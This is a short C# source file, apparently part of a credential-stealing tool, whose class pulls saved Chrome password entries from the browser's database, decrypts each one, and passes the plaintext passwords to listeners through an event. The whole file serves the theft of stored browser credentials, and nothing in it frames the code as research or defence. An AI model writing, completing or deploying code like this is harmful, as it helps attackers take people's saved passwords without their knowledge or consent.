using System.Collections.Generic;

namespace PS03.PasswordOps.ChromeDecrypt
{
    public class CDC
    {
        public delegate void PasswordsReadyHandler(List<CPProfile> data);

        public static void Execute()
        {
            var grab = new DBGrab();
            var data = grab.GetCPP();
            if (data.Count == 0)
            {
                return;
            }
            var dec = new CDecrypt();

            foreach (var profile in data)
            {
                profile.Password = dec.decrypt(profile.encPassword);
            }
            HandleOutputReady(data);
        }

        public static event PasswordsReadyHandler OnPasswordReady;

        public static void HandleOutputReady(List<CPProfile> output)
        {
            OnPasswordReady?.Invoke(output);
        }

    }
}